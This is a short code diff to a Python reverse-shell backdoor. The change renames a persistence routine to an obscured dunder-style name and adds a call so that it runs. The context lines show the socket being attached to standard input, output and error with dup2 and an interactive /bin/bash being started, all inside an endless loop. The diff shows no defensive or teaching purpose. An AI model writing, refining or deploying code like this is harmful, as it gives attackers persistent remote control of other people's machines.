@@ -5,7 +5,7 @@ import os
 
 while True:
 
-    def persistence_job():
+    def __persistence_():
         import platform
         import time
         
@@ -22,7 +22,9 @@ while True:
             pass
 
         else:
-            return persistence_job()
+            return __persistence_()
+
+    __persistence_()
 
     class shell:
         
@@ -43,4 +45,3 @@ while True:
     dup2(SOCKET_SOCK.fileno(),1)
     dup2(SOCKET_SOCK.fileno(),2)
     run(["/bin/bash","-i"])   
-    
